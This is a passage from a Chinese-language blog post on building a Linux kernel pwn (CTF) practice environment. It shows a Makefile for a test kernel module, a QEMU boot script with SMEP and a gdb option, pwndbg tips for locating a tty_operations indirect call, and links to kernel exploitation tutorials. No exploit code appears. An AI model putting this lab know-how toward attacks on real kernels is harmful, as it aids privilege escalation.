</span></span></code></pre></td></tr></table></div></div><p>在Makefile中写入</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-makefile data-lang=makefile><span class=line><span class=cl><span class=nv>obj-m</span> <span class=o>:=</span> hello.o
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>KERNELDR</span> <span class=o>:=</span> /home/liu/src/kernel/linux-5.4.72
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>PWD</span> <span class=o>:=</span> <span class=k>$(</span>shell <span class=nb>pwd</span><span class=k>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>modules</span><span class=o>:</span>
</span></span><span class=line><span class=cl>	<span class=k>$(</span>MAKE<span class=k>)</span> -C <span class=k>$(</span>KERNELDR<span class=k>)</span> <span class=nv>M</span><span class=o>=</span><span class=k>$(</span>PWD<span class=k>)</span> modules
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>modules_install</span><span class=o>:</span>
</span></span><span class=line><span class=cl>	<span class=k>$(</span>MAKE<span class=k>)</span> -C <span class=k>$(</span>KERNELDR<span class=k>)</span> M-<span class=k>$(</span>PWD<span class=k>)</span> modules_install
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>clean</span><span class=o>:</span>
</span></span><span class=line><span class=cl>	rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions
</span></span></code></pre></td></tr></table></div></div><p>然后<code>make</code></p><h3 id=4-启动系统>4. 启动系统<a hidden class=anchor aria-hidden=true href=#4-启动系统>#</a></h3><p>将hello.ko放入到busybox的_install目录下，使用pack打包。</p><p>将生成的rootfs.cpio，bzImage放在一个文件夹下面，并新建启动脚本<code>boot.sh</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=cp>#!/bin/sh
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>qemu-system-x86_64 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>-m 128M <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>-kernel ./bzImage <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>-initrd  ./rootfs.cpio <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>-append <span class=s2>&#34;console=ttyS0 root=/dev/ram oops=panic panic=1 kalsr&#34;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>-netdev user,id<span class=o>=</span>t0, -device e1000,netdev<span class=o>=</span>t0,id<span class=o>=</span>nic0 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>-monitor /dev/null <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>--nographic <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>-smp <span class=nv>cores</span><span class=o>=</span>2,threads<span class=o>=</span><span class=m>1</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>-cpu kvm64,+smep <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=c1>#-gdb tcp::1234 \</span>
</span></span><span class=line><span class=cl><span class=c1>#-S</span>
</span></span></code></pre></td></tr></table></div></div><p>执行boot.sh就可以看到输出的大小了。</p><p><img loading=lazy src=https://raw.githubusercontent.com/clxsh/pics/master/imgmodule_test.png></p><h2 id=to-do-list>to do list<a hidden class=anchor aria-hidden=true href=#to-do-list>#</a></h2><ol><li><p><del>如何定位call rax/call [rax+0x38]（tty_operation)</del></p><p>智熄了。。直接看call backtrace。从某个地址向前查看指令，可能会遇到指令不对齐的问题，多试几个数字，直到当前地址的指令显示正确。如地址<code>0xffffffff814dc0c6</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>pwndbg&gt; x/10i 0xffffffff814dc0c6-1
</span></span><span class=line><span class=cl>   0xffffffff814dc0c5:  cmp    BYTE PTR <span class=o>[</span>rcx+rcx*4-0x9<span class=o>]</span>,cl
</span></span><span class=line><span class=cl>   0xffffffff814dc0c9:  mov    r15d,eax    <span class=c1># 未对齐</span>
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>pwndbg&gt; x/10i 0xffffffff814dc0c6-2
</span></span><span class=line><span class=cl>   0xffffffff814dc0c4:  push   rax
</span></span><span class=line><span class=cl>   0xffffffff814dc0c5:  cmp    BYTE PTR <span class=o>[</span>rcx+rcx*4-0x9<span class=o>]</span>,cl
</span></span><span class=line><span class=cl>   0xffffffff814dc0c9:  mov    r15d,eax    <span class=c1># 未对齐</span>
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>pwndbg&gt; x/10i 0xffffffff814dc0c6-3
</span></span><span class=line><span class=cl>   0xffffffff814dc0c3:  call   QWORD PTR <span class=o>[</span>rax+0x38<span class=o>]</span>
</span></span><span class=line><span class=cl>   0xffffffff814dc0c6:  mov    rdi,r14    <span class=c1># 对齐成功</span>
</span></span><span class=line><span class=cl>...
</span></span></code></pre></td></tr></table></div></div></li><li><p><del>struct size 计算。编译简单module <a href=http://myhackerworld.top/2019/01/06/%E5%86%85%E6%A0%B8pwn-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/>ref1</a> <a href=https://www.anquanke.com/post/id/203399#h2-10>ref2</a></del></p></li></ol><h2 id=参考>参考<a hidden class=anchor aria-hidden=true href=#参考>#</a></h2><ol><li><a href=https://www.cyberciti.biz/tips/compiling-linux-kernel-26.html>How to compile and install linux kernel 5.6.9 from souce code?</a></li><li><a href=http://mgalgs.github.io/2012/03/23/how-to-build-a-custom-linux-kernel-for-qemu.html>How to Build A Custom Linux Kernel For Qemu?</a></li><li><a href=https://m4x.fun/post/linux-kernel-pwn-abc-1>Linux Kernel Pwn ABC(Ⅰ)</a></li><li><a href=https://m4x.fun/post/linux-kernel-pwn-abc-2/>Linux Kernel Pwn ABC(II)</a></li><li><a href=https://binlep.github.io/2020/03/12/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91Linux%20Kernel%20%E8%B0%83%E8%AF%95%E6%96%87%E4%BB%B6%E6%80%BB%E7%BB%93/>Kernel调试文件总结</a></li><li><a href=https://unix.stackexchange.com/questions/5518/what-is-the-difference-between-the-following-kernel-makefile-terms-vmlinux-vml>What is the difference between the following kernel Makefile terms: vmLinux, vmlinuz, vmlinux.bin, zimage & bzimage?</a></li><li><a href=https://www.anquanke.com/post/id/201043>Kernel Pwn 学习之路(一)</a></li><li><a href=https://stackoverflow.com/questions/11756153/whats-the-difference-between-iret-and-iretd-iretq>what&rsquo;s the difference between iret and iretd,iretq?</a></li><li><a href=http://blog.vmsplice.net/2011/09/how-to-share-files-instantly-between.html>How to share files instantly between virtual machines and host</a></li><li><a href=https://xz.aliyun.com/t/4529>Linux Pwn技巧总结_1 &ndash; V1NKe</a></li><li><a href=https://whereisk0shl.top/NCSTISC%20Linux%20Kernel%20pwn450%20writeup.html>NCSTISC Linux Kernel PWN450 Writeup</a></li><li><a href=http://myhackerworld.top/2019/01/06/%E5%86%85%E6%A0%B8pwn-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/>内核Pwn 环境搭建</a></li></ol></div><footer class=post-footer><ul class=post-tags><li><a href=https://hhdx.xyz/tags/kernel-pwn/>Kernel Pwn</a></li><li><a href=https://hhdx.xyz/tags/ctf/>CTF</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://hhdx.xyz/>hhdx's blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>